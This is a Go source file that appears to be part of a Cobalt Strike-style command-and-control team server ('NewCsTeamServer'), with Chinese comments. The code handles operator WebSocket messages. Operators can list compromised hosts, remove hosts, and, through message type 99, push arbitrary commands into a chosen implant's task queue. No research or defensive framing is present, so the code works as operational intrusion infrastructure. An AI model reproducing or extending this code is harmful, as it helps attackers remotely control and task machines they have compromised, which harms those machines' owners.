package admin

import (
	"NewCsTeamServer/client"
	"NewCsTeamServer/task"
	"NewCsTeamServer/utils"
	"encoding/json"
	"fmt"
	"github.com/gorilla/websocket"
	"github.com/kataras/golog"
	"time"
)

func readAdminMessage(conn *websocket.Conn) (Message, error) {
	_, message, err := conn.ReadMessage()
	if err != nil {
		return Message{}, err
	}
	var msg Message
	if err := json.Unmarshal(message, &msg); err != nil {
		return Message{}, err
	}

	return msg, nil
}

func HandleAdminMessages(admin *Admin, clientIP string) {
	defer func() {
		GetConnectionManager().RemoveAdmin(admin, clientIP)
	}()

	GetConnectionManager().MonitorAdminHeartbeat(admin, 30*time.Second)
	for {
		msg, err := readAdminMessage(admin.Conn)
		if err != nil {
			GetConnectionManager().Logger.Errorf("Failed to read message from admin %s: %v", clientIP, err)
			break
		}
		msg.AdminID = admin.ID
		fmt.Println("msg:", msg)
		HandleAdminMessage(admin, msg)
	}
}

// HandleAdminMessage WebSocket接口
func HandleAdminMessage(admin *Admin, msg Message) {
	GetConnectionManager().UpdateAdminHeartbeat(admin) //更新心跳
	switch msg.Type {
	case 1: //获取主机列表
		list := client.GlobalClientManager.GetClientList()
		data, _ := json.Marshal(list)
		GetConnectionManager().BroadcastToAdmins(Message{
			ID:      msg.ID,
			Type:    msg.Type,
			Content: string(data),
		})
		return
	case 2: //发送消息到全部客户端，除了本身
		GetConnectionManager().BroadcastToAdminsNoMe(Message{
			ID:      utils.GetUuid(),
			Type:    2,
			Content: msg.Content,
		}, admin.ID)
		return
	case 3: //移除指定客户端
		cid := utils.StringToUint32(msg.Content)
		_, exists := client.GlobalClientManager.GetClient(cid)
		if !exists {
			GetConnectionManager().BroadcastToAdminsNoMe(Message{
				ID:      utils.GetUuid(),
				Type:    -1, //错误提示
				Content: "没有找到指定客户端",
			}, admin.ID)
			return
		}
		client.GlobalClientManager.RemoveClient(cid) //移除客户端
		GetConnectionManager().BroadcastToAdminsNoMe(Message{
			ID:      utils.GetUuid(),
			Type:    3,
			Content: "移除成功",
		}, admin.ID)
		return
	case 99: //发送命令到客户端
		var req struct {
			ClientID uint32 `json:"client_id"`
			Type     uint32 `json:"type"` // 4字节命令类型，适配客户端
			Content  string `json:"content"`
		}
		json.Unmarshal([]byte(msg.Content), &req)
		fmt.Println("req:", req)
		client, exists := client.GlobalClientManager.GetClient(req.ClientID)
		if !exists {
			golog.Error("没有找到指定客户端")
			return
		}
		if req.Type == 0 {
			req.Type = 78
		}
		task := task.Task{
			ID:        fmt.Sprintf("%d-%d", req.ClientID, time.Now().UnixNano()),
			Type:      req.Type,
			Content:   []byte(req.Content),
			CreatedAt: time.Now(),
		}
		client.TaskQueue.AddTask(task)
		GetConnectionManager().BroadcastToAdmins(Message{
			ID:      msg.ID,
			Type:    msg.Type,
			Content: "任务下发成功.",
		})
		return
	}
}
